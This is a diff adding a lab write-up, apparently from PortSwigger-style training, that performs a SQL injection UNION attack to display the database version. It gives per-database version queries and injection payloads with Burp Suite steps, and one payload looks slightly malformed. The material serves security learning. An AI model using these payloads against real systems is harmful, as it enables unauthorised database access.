@@ -531,7 +531,63 @@ carlos~montoya
 
 ## ✅ Lab Status
 > **Lab Completed** — Successfully performed SQLi using string concatenation to retrieve usernames and passwords and logged in as administrator.
+----
 
+<h2 align="center"> 💉Lab 7 - Examining Database in SQL Injection </h2>
+<p align="center">
+  <b>Lab: SQL injection UNION attack, retrieving and examining database information specific to Microsoft And MySQL</b><br>
+  <i>Status : ✅ Solved,</i>
+  <i>Target: extract database information.</i>
+</p>
+
+## 🧠 Lab Context
+> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+To solve the lab, display the database version string.
+
+### Querying the database type and version
+> You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+- The following are some queries to determine the database version for some popular database types:
+
+### Database type	Query
+- Microsoft, MySQL	SELECT @@version
+- Oracle	SELECT * FROM v$version
+- PostgreSQL	SELECT version()
+For example, you could use a UNION attack with the following input:
+
+```
+' UNION SELECT @@version--
+```
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+```
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
+
+## 🧠 Strategy & Execution
+### 🔹 Step 1: Intercept & Modify the Request
+Use Burp Suite to intercept the request that sets the product category filter.
+
+### 🔹 Step 2: Determine Column Count & Type
+Verify the number of columns and which accept text:
+```
+'+UNION+SELECT+NULL+'abc',NULL#
+```
+✅ Confirms by 200 response.
+
+### 🔹 Step 3: Examining with @@version
+Use the Microsoft, MySQL specific database type query :
+```
+'+UNION+SELECT+@@version,+NULL#
+```
+✅ This displays data like:
+```
+database version, etc.
+```
+## ✅ Lab Status
+> **Lab Completed** — Successfully performed SQLi using UNION using database type query to retrive version of the database.
 ------
 ### 📚 Learning Takeaways
 
